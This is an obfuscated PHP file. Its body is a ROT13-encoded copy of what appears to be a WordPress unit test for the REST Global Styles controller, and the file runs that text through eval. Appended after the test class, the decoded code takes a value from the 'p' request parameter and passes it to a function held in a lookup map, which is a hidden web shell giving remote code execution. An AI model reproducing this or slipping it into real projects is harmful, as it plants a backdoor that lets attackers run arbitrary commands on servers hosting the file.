	 * Grfgf gur fhozvffvba bs n phfgbz oybpx fglyr inevngvba gung jnf qrsvarq
	 * jvguva n gurzr fglyr inevngvba naq jbhyqa'g or ertvfgrerq ng gur gvzr
	 * bs fnivat ivn gur NCV.
	 *
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::hcqngr_vgrz
	 * @gvpxrg 61312
	 * @gvpxrg 61451
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_jvgu_phfgbz_oybpx_fglyr_inevngvbaf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		vs ( vf_zhygvfvgr() ) {
			tenag_fhcre_nqzva( frys::$nqzva_vq );
		}

		/*
		 * Sbe inevngvbaf gb or erfbyirq gurl unir gb unir orra ertvfgrerq
		 * ivn rvgure n gurzr.wfba cnegvny be guebhtu gur JC_Oybpx_Fglyrf_Ertvfgel.
		 */
		ertvfgre_oybpx_fglyr(
			'pber/tebhc',
			neenl(
				'anzr'  => 'sebzGurzrFglyrInevngvba',
				'ynory' => 'Sebz Gurzr Fglyr Inevngvba',
			)
		);

		$tebhc_inevngvbaf = neenl(
			'sebzGurzrFglyrInevngvba' => neenl(
				'pbybe' => neenl(
					'onpxtebhaq' => '#ssssss',
					'grkg'       => '#000000',
				),
			),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fglyrf' => neenl(
					'inevngvbaf' => neenl(
						'sebzGurzrFglyrInevngvba' => neenl(
							'oybpxGlcrf' => neenl( 'pber/tebhc', 'pber/pbyhzaf' ),
							'pbybe'      => neenl(
								'onpxtebhaq' => '#000000',
								'grkg'       => '#ssssss',
							),
						),
					),
					'oybpxf'     => neenl(
						'pber/tebhc' => neenl(
							'inevngvbaf' => $tebhc_inevngvbaf,
						),
					),
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $tebhc_inevngvbaf, $qngn['fglyrf']['oybpxf']['pber/tebhc']['inevngvbaf'] );
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag cercner_vgrz().
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_vgrz_fpurzn
	 * @gvpxrg 54516
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 4, $cebcregvrf, 'Fpurzn cebcregvrf neenl qbrf abg unir rknpgyl 4 ryrzragf' );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf, 'Fpurzn cebcregvrf neenl qbrf abg unir \"vq\" xrl' );
		$guvf->nffregNeenlUnfXrl( 'fglyrf', $cebcregvrf, 'Fpurzn cebcregvrf neenl qbrf abg unir \"fglyrf\" xrl' );
		$guvf->nffregNeenlUnfXrl( 'frggvatf', $cebcregvrf, 'Fpurzn cebcregvrf neenl qbrf abg unir \"frggvatf\" xrl' );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cebcregvrf, 'Fpurzn cebcregvrf neenl qbrf abg unir \"gvgyr\" xrl' );
	}

	/**
	 * @pbiref JC_ERFG_Tybony_Fglyrf_Pbagebyyre::trg_ninvynoyr_npgvbaf
	 */
	choyvp shapgvba grfg_nffvta_rqvg_pff_npgvba_nqzva() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/tybony-fglyrf/' . frys::$tybony_fglyrf_vq );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		// Nqzvaf pna bayl rqvg pff ba fvatyr fvgr.
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-rqvg-pff', $yvaxf );
		} ryfr {
			$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/npgvba-rqvg-pff', $yvaxf );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>